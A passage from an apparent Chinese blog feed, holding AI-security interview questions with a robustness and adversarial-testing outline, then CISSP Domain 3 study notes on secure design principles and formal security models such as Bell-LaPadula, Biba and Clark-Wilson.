    <content type="html"><![CDATA[<h2 id="基础问题"><a href="#基础问题" class="headerlink" title="基础问题"></a>基础问题</h2><p>大模型的原理？如何从0到1训练一个大模型？</p><p>Transfromer的原理或架构介绍一下？（大模型的底层是Transfromer，可以再深入问解码器、编码器、自注意力Self-Atention机制原理，为什么要有自注意力机制）</p><p>现在的大模型大部分是decoder-only的结构</p><h2 id="应用问题（AI-FOR-SEC）"><a href="#应用问题（AI-FOR-SEC）" class="headerlink" title="应用问题（AI FOR SEC）"></a>应用问题（AI FOR SEC）</h2><p>AI赋能安全有哪些场景，可以举个实践例子？</p><p>将大模型应用到安全有哪些应用介绍一下？</p><p>如何训练一个安全相关的大模型？数据从哪里来的？数据清洗做了吗？</p><p>大模型幻觉怎么处理的？</p><p>大模型微调怎么做的？效果如何？</p><p>大模型上下文限制怎么做？毕竟有些日志或者多条日志很容易超出大模型限制？</p><h2 id="大模型安全检测（SEC-FOR-AI）"><a href="#大模型安全检测（SEC-FOR-AI）" class="headerlink" title="大模型安全检测（SEC FOR AI）"></a>大模型安全检测（SEC FOR AI）</h2><p>大模型的全生命周期如何保障？如训练数据、模型训练、模型微调、大模型应用阶段</p><p>大模型安全问题怎么测试？如越狱、prompt信息泄露、多步攻击、上下文、模型参数窃取，怎么实现？如果自动化怎么实现？</p><p>如何保障大模型安全对齐？</p><p>大模型安全围栏怎么做？（如何兜底大模型的回答内容）</p><p>AI agent的安全风险有哪些？怎么检测？</p><p>MCP&#x2F;A2A框架的安全风险有哪些？怎么检测？</p><h2 id="可解释性"><a href="#可解释性" class="headerlink" title="可解释性"></a>可解释性</h2><h2 id="鲁棒性"><a href="#鲁棒性" class="headerlink" title="鲁棒性"></a>鲁棒性</h2><p>模型在对抗扰动、分布偏移等干扰下的问题表现。</p><h3 id="鲁棒性测试"><a href="#鲁棒性测试" class="headerlink" title="鲁棒性测试"></a>鲁棒性测试</h3><h4 id="数据扰动测试"><a href="#数据扰动测试" class="headerlink" title="数据扰动测试"></a>数据扰动测试</h4><h5 id="数值型字段扰动"><a href="#数值型字段扰动" class="headerlink" title="数值型字段扰动"></a>数值型字段扰动</h5><p><strong>微小扰动测试</strong></p><p><strong>极端值注入</strong></p><h5 id="类别型字段扰动"><a href="#类别型字段扰动" class="headerlink" title="类别型字段扰动"></a>类别型字段扰动</h5><p>标签噪声测试</p><p>类别分布偏移</p><h5 id="缺失值与异常值处理"><a href="#缺失值与异常值处理" class="headerlink" title="缺失值与异常值处理"></a>缺失值与异常值处理</h5><p>缺失值注入</p><p>异常值检测</p><h3 id="对抗攻击测试"><a href="#对抗攻击测试" class="headerlink" title="对抗攻击测试"></a>对抗攻击测试</h3><h4 id="基于梯度的数值扰动（白盒攻击）"><a href="#基于梯度的数值扰动（白盒攻击）" class="headerlink" title="基于梯度的数值扰动（白盒攻击）"></a>基于梯度的数值扰动（白盒攻击）</h4><ul><li>FGSM&#x2F;PGD攻击</li><li>约束优化攻击</li></ul><h4 id="黑盒攻击（无模型信息）"><a href="#黑盒攻击（无模型信息）" class="headerlink" title="黑盒攻击（无模型信息）"></a>黑盒攻击（无模型信息）</h4><ul><li>迁移攻击</li><li>查询攻击</li></ul><h4 id="对抗样本的业务影响分析"><a href="#对抗样本的业务影响分析" class="headerlink" title="对抗样本的业务影响分析"></a>对抗样本的业务影响分析</h4><ul><li>对抗样本的可解释性</li><li>对抗防御成本评估</li></ul>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>8-域3安全架构与工程-安全模型、设计和能力原则</title>
    <link href="/2025/06/02/security/seccert/cissp/8-%E5%9F%9F3%E5%AE%89%E5%85%A8%E6%9E%B6%E6%9E%84%E4%B8%8E%E5%B7%A5%E7%A8%8B-%E5%AE%89%E5%85%A8%E6%A8%A1%E5%9E%8B%E3%80%81%E8%AE%BE%E8%AE%A1%E5%92%8C%E8%83%BD%E5%8A%9B%E5%8E%9F%E5%88%99/"/>
    <url>/2025/06/02/security/seccert/cissp/8-%E5%9F%9F3%E5%AE%89%E5%85%A8%E6%9E%B6%E6%9E%84%E4%B8%8E%E5%B7%A5%E7%A8%8B-%E5%AE%89%E5%85%A8%E6%A8%A1%E5%9E%8B%E3%80%81%E8%AE%BE%E8%AE%A1%E5%92%8C%E8%83%BD%E5%8A%9B%E5%8E%9F%E5%88%99/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h1 id="8-1-安全设计原则"><a href="#8-1-安全设计原则" class="headerlink" title="8.1 安全设计原则"></a>8.1 安全设计原则</h1><p>系统开发的每个阶段都应该考虑安全问题。</p><p>编程人员、开发人员、工程师都需要在各自阶段构建安全体系。</p><p>从开发项目早期阶段就周密考虑安全的影响。</p><h2 id="8-1-1-客体和主体"><a href="#8-1-1-客体和主体" class="headerlink" title="8.1.1 客体和主体"></a>8.1.1 客体和主体</h2><h3 id="主体"><a href="#主体" class="headerlink" title="主体"></a>主体</h3><p>主体（subject）是发出资源访问请求的主动实体。</p><p>主体可以是用户、进程、程序、计算机或机构。</p><h3 id="客体"><a href="#客体" class="headerlink" title="客体"></a>客体</h3><p>客体（object）是主体想要访问的被动实体。</p><p>客体可以是资源（文件、打印机）、用户、进程、程序、计算机或机构。</p><h3 id="访问"><a href="#访问" class="headerlink" title="访问"></a>访问</h3><p>访问是主体与客体之间的一种关系，可能包括读、写、更改、删除、打印、移动、备份等操作或活动。</p><p>主体和客户不是固定的，在一次事件中充当主体的，可能在下一次事件中会充当客体。</p><h3 id="信任传递"><a href="#信任传递" class="headerlink" title="信任传递"></a>信任传递</h3><p>信任传递（transitive trust）概念为：A 信任 B ，B 信任 C，那么 A 信任 C</p><p>严重的安全问题，可以绕过约束和限制。</p><p><img src="/image-20250602213338108.png" alt="image-20250602213338108"></p><h2 id="8-1-2-封闭系统和开放系统"><a href="#8-1-2-封闭系统和开放系统" class="headerlink" title="8.1.2 封闭系统和开放系统"></a>8.1.2 封闭系统和开放系统</h2><h3 id="封闭系统"><a href="#封闭系统" class="headerlink" title="封闭系统"></a>封闭系统</h3><p>封闭系统 close system</p><p>与同一制造商小范围系统协作</p><p>标准专有，不会公开</p><p>封闭系统更难与相异的系统集成，导致封闭系统<strong>更安全</strong></p><h3 id="开放系统"><a href="#开放系统" class="headerlink" title="开放系统"></a>开放系统</h3><p>开放系统 open system</p><p>使用公认的行业标准</p><p>更容易和其他厂商集成</p><p>采用标准通信组件，存在更多入口和攻击手段。</p><p>更受欢迎</p><p>更广泛的部署</p><p>安全性更依赖于安全和防御性编程实践规范，也更依赖于周密的深度防御部署战略。</p><h4 id="API"><a href="#API" class="headerlink" title="API"></a>API</h4><p>应用编程接口（application programming interface，API）</p><p>允许在计算元素（如应用程序、服务、网络、固件、硬件等）之间进行的一组定义明确的交互。</p><p>API 定义了可以提出的请求类型、提出请求的确切方法、交换的数据形式以及其他要求。</p><p>API  使计算元素之间的互相操作成为可能。</p><h3 id="开源和闭源"><a href="#开源和闭源" class="headerlink" title="开源和闭源"></a>开源和闭源</h3><p><strong>开源 open source</strong> </p><p>源代码和其他内部逻辑向公众公开的解决方案。</p><p>公开审查和评议改进</p><p><strong>闭源 closed source</strong></p><p>源代码和其他内部逻辑对公众保密的解决方案。</p><p>供应商和编程人员改进</p><p>均可有价出售或免费提供，商用一般是闭源。</p><p>闭源程序可以是开放系统、也可以是封闭系统</p><p>开源程序可以是开放系统、也可以是封闭系统</p><h2 id="8-1-3-默认安全配置"><a href="#8-1-3-默认安全配置" class="headerlink" title="8.1.3 默认安全配置"></a>8.1.3 默认安全配置</h2><p>默认暴政（the tyranny of the default）</p><p>永远不要假设任何产品的默认安全配置是安全的。</p><p>认为默认安全配置是糟糕的，逐项检查优化。</p><p>开发人员有责任为产品的每个配置选项提供详细说明。</p><h2 id="8-1-4-失效安全"><a href="#8-1-4-失效安全" class="headerlink" title="8.1.4 失效安全"></a>8.1.4 失效安全</h2><p>应用程序安全实效（fail securely）</p><p>故障管理的第一类措施是程序错误处理，也叫异常处理（exception handling）</p><p>try catch 语句，目的是迅速处理错误。</p><p>软失效（fail-soft）</p><p>失效安全（fail-secure )</p><p>失效保障（fail-safe）</p><p>失效打开（fail-open）</p><p>失效关闭（fail-closed）</p><p><strong>物理世界</strong>：</p><p>实体优先考虑保护人，但在一些情况下，资产却是优先于人得到保护的。</p><p><strong>数字世界</strong>：</p><p>实体专注于保护资产，保护的类型因CIA三元素不同。</p><p><strong>软失效</strong>：</p><p>允许系统在一个组件发生故障后继续运行。</p><p>也就是部分故障。</p><p><strong>失效保障</strong>：</p><p>如果产品会影响物理世界，则人的生命和安全是需要优先考虑的因素。</p><p>人类保护优先的设计思路被称为失效保障。</p><p>发生故障时，系统、设备或产品将还原到一种保护人员健康和安全的状态。</p><p><strong>失效安全</strong>：</p><p>失效安全系统将资产的物理安全置于任何其他考虑因素之上。</p><p>例如：银行金库、医学实验室、数据中心等。</p><p>物理世界语境中，失效打开和失效保障是同义词，失效关闭与失效安全是同义词。</p><p>数字式产品：</p><p>安全焦点在数字资产上，从安全三要素（可用性、保密性、完整性）的角度决定优先保护哪个方面。</p><p>如果优先保护可用性，故障时，允许保持连接和通信，也就是失效打开。</p><p>如果优先考虑保密性和完整性，故障时，必须切断连接或通信，也就是失效安全、失效关闭或失效保障，数据语境中避免使用失效保障。</p><p>失效打开状态，牺牲保密性和完整性保护可用性。</p><p>失效关闭状态，牺牲可用性来保护完整性和保密性。</p><table><thead><tr><th>物理语境</th><th>状态</th><th>数字语境</th></tr></thead><tbody><tr><td>保护人员</td><td>失效打开</td><td>保护可用性</td></tr><tr><td>保护人员</td><td>失效保障</td><td>保护保密性和完整性</td></tr><tr><td>保护资产</td><td>失效关闭</td><td>保护保密性和完整性</td></tr><tr><td>保护资产</td><td>失效安全</td><td>保护保密性和完整性</td></tr></tbody></table><h2 id="8-1-5-保持简单"><a href="#8-1-5-保持简单" class="headerlink" title="8.1.5 保持简单"></a>8.1.5 保持简单</h2><p>保持简单 keep it simple </p><p>KISS 原则，安全领域表示不要把环境、产品的设计的过于负责，越复杂，越难以保护。</p><h3 id="其他类似的概念"><a href="#其他类似的概念" class="headerlink" title="其他类似的概念"></a>其他类似的概念</h3><p><strong>不自我重复（DRY）</strong></p><p>不在多处重复相同的代码，避免修改时增加难度。</p><p><strong>计算极简主义</strong></p><p>尽可能少用硬件和软件资源</p><p><strong>最低耗能原则</strong></p><p>使用适合所需解决方案的最低耗能编程语言</p><p><strong>更坏的就是更好的</strong></p><p>功能较少的软件可能更安全。</p><p><strong>你不需要它（YAGNI）</strong></p><p>在真正需要的时候添加能力和功能。</p><p>KISS 原则鼓励所有人避免过于复杂的方案，支持简洁、优化的解决方案。</p><p>解决方案越简单，越容易保护，越容易排查故障，越容易验证。</p><h2 id="8-1-6-零信任-zero-trust"><a href="#8-1-6-零信任-zero-trust" class="headerlink" title="8.1.6 零信任 zero trust"></a>8.1.6 零信任 zero trust</h2><p>零信任（zero trust）指不对机构内部的任何东西自动予以信任。</p><p>永不信任，始终验证。</p><p>需要执行内部微分网段和严格落实最小特权原则。</p><p>零信任被用于各种不同的安全解决方案，包括内部分段防火墙（ISFW）、多因子身份认证（MFA）、身份和访问管理（IAM）以及下一代端点安全。</p><p>可信来源是根本不存在。</p><h2 id="8-1-7-通过设计保护隐私-PbD"><a href="#8-1-7-通过设计保护隐私-PbD" class="headerlink" title="8.1.7 通过设计保护隐私 PbD"></a>8.1.7 通过设计保护隐私 PbD</h2><p>通过设计保护隐私（Privacy by Design，PbD）指 在产品的早期设计阶段就把隐私保护机制集成在产品中。</p><p>安全是产品设计和架构的不可分割元素，自开发启动之初，贯穿整个软件开发生命周期，始终都要保持。</p><p>PbD 框架基于 七大 基本原则：</p><ul><li>主动而非被动，预防而非修补</li><li>以默认方式保护隐私</li><li>隐私嵌入式设计</li><li>所有功能-正和而非零和</li><li>端到端安全-全生命周期保护</li><li>可见性和透明性</li><li>尊重用户隐私</li></ul><p>全球隐私标准（GPS），目的在于建立一套通用且协调一致的隐私原则。</p><h2 id="8-1-8-信任但要验证"><a href="#8-1-8-信任但要验证" class="headerlink" title="8.1.8 信任但要验证"></a>8.1.8 信任但要验证</h2><p>“信任但要验证”  安全模型已不能满足现代安全需求。</p><p>使用零信任模型设计。</p><p>“信任但要验证”是首先根据初始身份认证流程授予内部“安全”环境访问权，然后依赖各种控制方法。</p><h1 id="8-2-用于确保保密性、完整性和可用性的技术"><a href="#8-2-用于确保保密性、完整性和可用性的技术" class="headerlink" title="8.2 用于确保保密性、完整性和可用性的技术"></a>8.2 用于确保保密性、完整性和可用性的技术</h1><p>为保证数据的保密性、完整性和可用性（CIA），必须确保可访问数据的所有组件都是安全的且行为端正。</p><h2 id="8-2-1-限定"><a href="#8-2-1-限定" class="headerlink" title="8.2.1 限定"></a>8.2.1 限定</h2><p>软件设计者借助“进程限定”约束程序的动作。</p><p>进程限定（confinement）使进程只能对某些内存位置和资源进行读和写，也就是沙箱（sandboxing）。</p><p>沙箱 就是对进程执行最小特权原则。</p><p>限定的目的是防止数据被泄露给未经授权的程序、用户和系统。</p><p>限定可由操作系统本身执行（进程隔离、内容保护），也可以借助一个限定应用程序或服务（Sandboxie）或虚拟化管理方案（VMware、VirtualBox）</p><h2 id="8-2-2-界限"><a href="#8-2-2-界限" class="headerlink" title="8.2.2 界限"></a>8.2.2 界限</h2><p><strong>界限可以充当执行限定的手段。</strong></p><p>系统上运行的每个进程都被分配了一个授权级别。</p><p>授权级别告知操作系统该进程可以执行哪些操作。</p><p>进程的界限（bound）由一些限制组成，规定进程可以访问的内存地址和资源。</p><p>简单系统可能只有两个授权级别：用户和内核。</p><p>更安全的系统会存在物理隔离，而不仅仅是逻辑界限隔离。</p><h2 id="8-2-3-隔离"><a href="#8-2-3-隔离" class="headerlink" title="8.2.3 隔离"></a>8.2.3 隔离</h2><p>当一个进程因为访问界限的执行而被限定时，就是在隔离状态下运行。</p><p>进程隔离可以确保被隔离进程的任何行为只影响与之关联的内存和资源。</p><p>隔离（isolation）是用来保护操作环境、操作系统内核以及其他独立应用程序的。</p><p>隔离使软失效环境得以实现。</p><p>隔离的实现依赖于限制的执行（以设置界限的方式）</p><p><strong>限定</strong>：确保活跃进程只能访问特定资源（内存等）</p><p><strong>界限</strong>：对进程的授权限制，使进程只能与规定的资源交互，且只被允许进行特定类型的交互。</p><p><strong>隔离</strong>：通过界限执行界定的手段。</p><h2 id="8-2-4-访问控制"><a href="#8-2-4-访问控制" class="headerlink" title="8.2.4 访问控制"></a>8.2.4 访问控制</h2><p>访问控制限制主体对客体的访问。</p><p>访问控制可选项：</p><ul><li>自主访问控制</li><li>基于角色的访问控制</li><li>强制性访问控制</li></ul><h2 id="8-2-5-信任和保证"><a href="#8-2-5-信任和保证" class="headerlink" title="8.2.5 信任和保证"></a>8.2.5 信任和保证</h2><p>可信系统（trusted system）是指所有保护机制协同工作，可以为许多类型的用户处理敏感数据，并使环境保持稳定、安全的系统。</p><p>信任是安全机制、功能或能力的体现。</p><p>保证（assurance）是指满足安全需求的可信程度。</p><p>保证体现了安全机制在提供安全保护方面有多可靠。</p><p>保证必须持续保持、即时更新和反复验证。</p><h1 id="8-3-理解安全模型的基本概念"><a href="#8-3-理解安全模型的基本概念" class="headerlink" title="8.3 理解安全模型的基本概念"></a>8.3 理解安全模型的基本概念</h1><p>模型提供一种把安全策略形式化的手段。</p><p>提出一套可供计算机遵守，用于执行构成安全策略的基本安全概念、进程和规程的明确规则。</p><h3 id="安全模型"><a href="#安全模型" class="headerlink" title="安全模型"></a>安全模型</h3><p>安全模型（security model）为软件设计人员提供了用来衡量自己设计和执行方案的参照物。</p><h3 id="安全令牌"><a href="#安全令牌" class="headerlink" title="安全令牌"></a>安全令牌</h3><p>安全令牌（token）是与资源关联的独体客体，描述了资源的安全属性。</p><p>令牌可在主体请求访问实际客体之间传达有关客体的安全信息。</p><h3 id="能力列表"><a href="#能力列表" class="headerlink" title="能力列表"></a>能力列表</h3><p>能力列表（capability list）为每个受控客体各保存一列安全属性信息。</p><p>没有令牌灵活，也能提供比较快捷的查找。</p><h3 id="安全标签"><a href="#安全标签" class="headerlink" title="安全标签"></a>安全标签</h3><p>安全标签（security label）</p><p>附着在客体上的一个永久部分。</p><p>一旦设定，无法更改，提供了防篡改保护措施。</p><p>防篡改保护措施令牌和能力列表没有。</p><h2 id="8-3-1-可信计算基"><a href="#8-3-1-可信计算基" class="headerlink" title="8.3.1 可信计算基"></a>8.3.1 可信计算基</h2><p>可信计算基（trusted computing base，TCB）设计原则是硬件、软件和控制的集合体。</p><p>TCB 是完整信息系统的子集。</p><p>安全策略和执行方面，TCB 是系统中唯一一个可以信任的部分。</p><p>无论遇到什么事情都遵守安全策略，确保系统在所有情况下都行为恰当，是 TCB 组件的责任。</p><h3 id="1-安全边界"><a href="#1-安全边界" class="headerlink" title="1. 安全边界"></a>1. 安全边界</h3><p>系统的安全边界（security perimeter）是一个假想的边界，可将 TCB 与系统的其余部分分隔开。</p><p>TCB 如果要与系统的其余部分通信，则必须创建安全信道，也叫可信路径（trusted path）。</p><p>可信路径是按严格标准建立的一条信道，可在进行必要通信时不将 TCB暴露给对安全漏洞的恶意利用。</p><p>安全边界允许使用可信壳（trusted shell）。</p><p>可使主体在不给 TCB 或主体带来风险的情况下进行命令行操作。</p><h3 id="2-参考监视器和内核"><a href="#2-参考监视器和内核" class="headerlink" title="2. 参考监视器和内核"></a>2. 参考监视器和内核</h3><p>TCB 中负责在授权访问请求之前验证对每个资源的访问的部分被称作参考监视器（reference monitor）。</p><p>参考监视器处于每个主体和客体之间，用于验证请求主体的凭证是否符合客体访问要求，只对符合系统访问规则的请求授权。</p><p>TCB 中用于执行参考监视器功能的组件集合被称为安全内核（security kernel）。</p><p>安全内核的目的是启动相关组件来执行参考监视器功能并抵御所有已知攻击。</p><h2 id="8-3-2-状态机模型"><a href="#8-3-2-状态机模型" class="headerlink" title="8.3.2 状态机模型"></a>8.3.2 状态机模型</h2><p>状态机模型（state machine model）描述了一个无论处于什么状态都始终安全的系统。</p><p>基于有限状态机（finite state machine，FSM）的计算机科学定义。</p><p>FSM 会在给定的一个输入和一个状态的情况下转换到另一个状态并可能产生一个输出。</p><p>下一个状态 &#x3D; F（输入，当前状态）</p><p>输出 &#x3D; F（输入，当前状态）</p><p>状态（state）是特定时刻的系统快照。</p><p>状态转换：接受输入或输出时发生转换，产生新的状态。</p><p>所有状态转换都必须接受评估。</p><p>安全状态机（secure state machine）：每个可能的状态转换都产生了另一个安全状态的系统。</p><p>安全状态机模型系统总是以安全状态启动，在所有状态中保持一种安全状态，并且只允许主体以符合安全策略的方式访问资源。</p><p>安全状态机模型是许多其他安全模型的基础。</p><h2 id="8-3-3-信息流模型"><a href="#8-3-3-信息流模型" class="headerlink" title="8.3.3 信息流模型"></a>8.3.3 信息流模型</h2><p>信息流模型（information flow model）专注于控制信息的流动。</p><p>信息流模型基于状态机模型。</p><p>多级模型：在不同安全级别之间防止未经授权、不安全或受限制的信息流。</p><p>信息流模型允许所有得到授权的信息流通过，同时阻止所有未经授权的信息流。</p><p>信息流表明了一个对象从一个时间点的一种状态到另一时间点的另一状态的转换。</p><p>信息流模型还可通过明确排除所有非定义流动路径来解决隐蔽信道问题，也就是白名单机制。</p><h2 id="8-3-4-无干扰模型"><a href="#8-3-4-无干扰模型" class="headerlink" title="8.3.4 无干扰模型"></a>8.3.4 无干扰模型</h2><p>无干扰模型（noninterference model）大致基于信息流模型。</p><p>无干扰模型关注的是较高安全级别主体的动作会对较低安全级别主体的动作产生的影响。</p><p>高级别主体的动作不应该影响到低级别主体的动作。</p><p>无干扰模型的使用可以提供一种防止木马、后门、rootkit 等恶意程序造成损害的保护手段。</p><h3 id="组合理论"><a href="#组合理论" class="headerlink" title="组合理论"></a>组合理论</h3><p>组合理论（composition theories）：解释了一个系统的输出和另一个系统的输入有怎样的关系</p><p>组合理论类型：</p><ul><li>级联（cascading）：一个系统的输入来自另一个系统的输出。</li><li>反馈（feedback）：一个系统向另一个系统提供输入，由后者进行角色互换（A 先为 B 提供输入，B 再向 A 提供输入）</li><li>连接（hookup）：一个系统在把输入发送给另一个系统的同时还将其发送给了外部实体。</li></ul><h2 id="8-3-5-获取-授予模型"><a href="#8-3-5-获取-授予模型" class="headerlink" title="8.3.5 获取-授予模型"></a>8.3.5 获取-授予模型</h2><p>获取-授予模型（take-grant model）用一个定向图规定应该怎样把权限从一个主体传递给另一个主体或者从一个主体传递给另一个客体。</p><p>获取-授予模型基本有 4 条规则：</p><ul><li>获取规则：允许主体获取客体的权限</li><li>授予规则：允许主体向客体授予权限</li><li>创建规则：允许主体创建新权限</li><li>移除规则：允许主体移除自己拥有的权限</li></ul><p>获取和授予规则实际上是一种复制功能，类似于继承权限。</p><p>模型要点：</p><p>使用授予、获取、创建和移除规则后，能够确定何时可以更改系统相关权限，以及什么位置发生了泄漏（无意间分配了权限）。</p><h2 id="8-3-6-访问控制矩阵"><a href="#8-3-6-访问控制矩阵" class="headerlink" title="8.3.6 访问控制矩阵"></a>8.3.6 访问控制矩阵</h2><p>访问控制矩阵（access control matrix）是由主体和客体组成的表格，标明了每个主体可以对每个客体执行的操作或功能。</p><p>列是依照客体排列的访问控制列表（ACL）</p><p>行是每个被列主体的能力列表。</p><p>ACL 与客体相关联，能力列表与主体相关联。</p><h2 id="8-3-7-Bell-LaPadula-模型"><a href="#8-3-7-Bell-LaPadula-模型" class="headerlink" title="8.3.7 Bell-LaPadula 模型"></a>8.3.7 Bell-LaPadula 模型</h2><p>具有任何级别许可权的主体可以访问该许可级别或低于该级别的资源。</p><p>在许可权级别内，也只能因需可知（need-to- know）原则授予对分隔开的客体访问权。</p><p>防止涉密信息泄漏或者被转移到安全性较低的许可级别，通过限制低级别访问高级别。</p><p>保持客体的保密性。</p><p>建立在状态机概念和信息流模型之上，增加了强制访问控制和基于格子的访问控制概念。</p><p><strong>三个基本属性</strong>：</p><ul><li>简单安全属性（Simple Security Property）规定主体不可读取更高敏感度级别的信息（不可向上读）</li><li>*安全属性（*security property）规定主体不可把信息写入较低敏感度级别的客体（不可向下写），也称为限定属性（Confinement Property）</li><li>自主安全属性（Discretionary Security Property）规定系统通过一个访问矩阵执行自主访问控制。</li></ul><p>简单安全属性和安全属性，定义了系统可以转换到哪些状态。</p><p>基于 Bell-LaPadula 模型的系统可以提供状态机模型的安全性。</p><p>自主安全属性，执行了主体基于其工作或角色按需访问客体的规则。</p><p>可信主体不受安全属性约束。</p><h2 id="8-3-8-Biba-模型"><a href="#8-3-8-Biba-模型" class="headerlink" title="8.3.8 Biba 模型"></a>8.3.8 Biba 模型</h2><p>Biba 模型侧重完整性问题。</p><p>Biba 模型建立在状态机概念上，基于信息流，是一个多级模型。</p><p>Biba 模型是一个反向 Bell-LaPadula 模型。</p><p><strong>Biba 模型属性</strong>：</p><ul><li>简单完整性属性（Simple Integrity Property）规定主体不能读取较低完整性级别的客体（不可向下读）</li><li>*完整性属性（*Integrity Property）规定主体不能修改较高完整性级别的对象（不可向上写）</li></ul><p>简单属性总是涉及读。</p><p>星属性总是涉及写。</p><p>未被阻止或禁止的就是被允许的。</p><p><strong>考试中，有关属性定义或含义的考题的最佳答案是否定陈述，如果考题中没有这样的选项，那么相反的隐含操作将是次好的答案。</strong></p><p>简单完整性属性-不可向下读：把未经验证的数据读入经过验证的文档是不允许的，存在数据污染的可能性。</p><p>Biba 模型在设计上解决了三个完整性问题：</p><ul><li>防止未经授权的主体修改客体</li><li>防止授权主体对客体进行未经授权的修改</li><li>保护内部和外部客体的一致性</li></ul><p>Biba 模型要求所有主体和客体都被贴上定密分类标签，数据完整性保护由数据定密分类决定。</p><p>Biba 模型缺点：</p><ul><li>只解决完整性，不涉及保密性和可用性。</li><li>专注于使客体免受外部威胁侵扰，但是假定内部威胁会以程序化方式被处理。</li><li>没有涉及访问控制管理，也没有提供分配或更改客体和主体定密级别的方式。</li><li>不能阻止隐蔽信道。</li></ul><p><img src="/image-20250604112829152.png" alt="image-20250604112829152"></p><p><em><em>Bell 简单属性不可向上读，</em> 属性不可向下写。保密性。</em>*</p><p><em><em>Biba 简单属性不可向下读，</em> 属性不可向上写。完整性。</em>*</p><h2 id="8-3-9-Clark-Wilson-模型"><a href="#8-3-9-Clark-Wilson-模型" class="headerlink" title="8.3.9 Clark-Wilson 模型"></a>8.3.9 Clark-Wilson 模型</h2><p>Clark-Wilson 模型实现数据的完整性。</p><p>Clark-Wilson 模型没有定义正式状态机，而是定义每个数据项并且只允许通过一个受限或受控中间程序或接口进行修改。</p><p>Clark-Wilson 模型采用名为三元组或访问控制三元组（access control triplet）的主体&#x2F;程序&#x2F;客体（或主体&#x2F;交易&#x2F;客体）的三方关系。</p><p>Clark-Wilson 模型借助事务和职责分离原则提供完整性保护的有效手段。</p><p><img src="/image-20250604113853144.png" alt="image-20250604113853144"></p><p>Clark-Wilson 模型定义的数据项和规程：</p><ul><li><p>受约束数据项（constrained data item，CDI）指完整性受安全模型保护的任何数据项。</p></li><li><p>无约束数据项（unconstrained data item，UDI）指不受安全模型控制的任何数据项。</p><p>任何输入但未经验证的数据或任何输入，都属于无约束数据项。</p></li><li><p>完整性验证规程（integrity verification procedure，IVP）扫描数据项并确认其完整性的规程。</p></li><li><p>转换规程（transformation procedure，TP）指被允许修改 CDI 的唯一规程。通过 TP 限制对 CDI 的访问，</p></li></ul><p>Clark-Wilson 模型根据安全标签授予对客体的访问权，但仅通过转换规程和受限接口模型（restricted interface model）授予。</p><p>Clark-Wilson 模型可确保数据不会被任何未经授权的用户更改。</p><p>Clark-Wilson 模型执行了职责分离。</p><h2 id="8-3-10-Brewer-and-Nash-模型"><a href="#8-3-10-Brewer-and-Nash-模型" class="headerlink" title="8.3.10 Brewer and Nash 模型"></a>8.3.10 Brewer and Nash 模型</h2><p>Brewer and Nash 模型是为了让访问控制可以根据用户先前的活动动态地作出改变。</p><p>Brewer and Nash 模型适用于单个集成的数据库，寻求创建对利益冲突概念敏感的安全域。</p><p>Brewer and Nash 模型创建一类数据，定义哪些安全域存在潜在冲突，并阻止有权访问属于特定冲突类别安全域的任何主体访问  属于相同冲突类别的任何其他安全域。</p><p>Brewer and Nash 在每个冲突类别内使用数据隔离原则。</p><p>必须动态更新冲突类的成员和定义。</p><h2 id="8-3-11-Goguen-Meseguer-模型"><a href="#8-3-11-Goguen-Meseguer-模型" class="headerlink" title="8.3.11 Goguen-Meseguer 模型"></a>8.3.11 Goguen-Meseguer 模型</h2><p>Goguen-Meseguer 模型是一个完整性模型。</p><p>Goguen-Meseguer 模型是非干涉性概念理论的基础。</p><p>Goguen-Meseguer 模型以主体可访问的预先确定的客体集或域为基础。</p><p>Goguen-Meseguer 模型的根基是自动控制理论和域隔离。</p><p>只允许主体对预定客体执行预定操作。</p><p>一个主体域的成员将不能干扰另一个主体域的成员。</p><p>主体不能干扰彼此的活动。</p><h2 id="8-3-12-Sutherland-模型"><a href="#8-3-12-Sutherland-模型" class="headerlink" title="8.3.12 Sutherland 模型"></a>8.3.12 Sutherland 模型</h2><p>Sutherland 模型是一个完整性模型，专注于通过防止干扰来支持完整性。</p><p>Sutherland 模型基于状态机模型和信息流模型。</p><p>Sutherland 模型通过只使用预先定义的安全状态来保持完整性和阻止干扰。</p><p>使用 Sutherland 模型的例子：防止隐蔽信道被用来影响进程或活动的结果。</p><h2 id="8-3-13-Graham-Denning-模型"><a href="#8-3-13-Graham-Denning-模型" class="headerlink" title="8.3.13 Graham-Denning 模型"></a>8.3.13 Graham-Denning 模型</h2><p>Graham-Denning 模型专注于主体和客体的安全创建和删除。</p><p>Graham-Denning 模型是八条主要保护规则或操作的集合，用于定义某些安全操作的边界。</p><ul><li>安全创建客体</li><li>安全创建主体</li><li>安全删除客体</li><li>安全删除主体</li><li>安全提供读取访问权</li><li>安全提供授权访问权</li><li>安全提供删除访问权</li><li>安全提供传输访问权</li></ul><p>主体在一组客体上执行某些操作的具体能力或权限通常被定义在一个访问矩阵（也叫访问控制矩阵）中。</p><h2 id="8-3-14-Harrison-Ruzzo-Ullman-模型"><a href="#8-3-14-Harrison-Ruzzo-Ullman-模型" class="headerlink" title="8.3.14 Harrison-Ruzzo-Ullman 模型"></a>8.3.14 Harrison-Ruzzo-Ullman 模型</h2><p>Harrison-Ruzzo-Ullman（HRU）模型专注于给主体分配客体的访问权限以及这些被分配权限的韧性。</p><p>HRU 是 Graham-Denning 模型的扩展。</p><p>HRU 建立一个有限规程集（或访问权限集）为中心，利用规程编辑或更改主体对客体的访问权限。</p><p>HRU 模型定义了一个有限命令或基元（primitive）集，以便控制授权主体修改矩阵的方式。</p><p>“星”计划，也就是“安全信任保障和风险”计划，简称 STAR。</p><p>该计划致力于通过审计、透明度和标准来提高云服务提供商CSP的安全性。</p><h1 id="8-4-根据系统安全要求挑选控制"><a href="#8-4-根据系统安全要求挑选控制" class="headerlink" title="8.4 根据系统安全要求挑选控制"></a>8.4 根据系统安全要求挑选控制</h1><p>安全评估常常由可信的第三方负责进行。</p><h2 id="8-4-1-通用准则-CC"><a href="#8-4-1-通用准则-CC" class="headerlink" title="8.4.1 通用准则 CC"></a>8.4.1 通用准则 CC</h2><p>“通用准则”（Common Criteria，CC）定义了测试和确认系统安全能力的各种级别，级别上标注的数字表示执行了哪种测试和确认。</p><p>最高 CC 评级，也不能保证系统绝对安全。</p><p>“通用准则” 是一个动态主观性产品评估模型。</p><h3 id="“通用准则”CC-指南的目标"><a href="#“通用准则”CC-指南的目标" class="headerlink" title="“通用准则”CC 指南的目标"></a>“通用准则”CC 指南的目标</h3><ul><li>提升购买者对已评估和已评级的 IT 产品安全性的信心</li><li>消除重复评估</li><li>提高安全评估的效率和效果</li><li>确保 IT 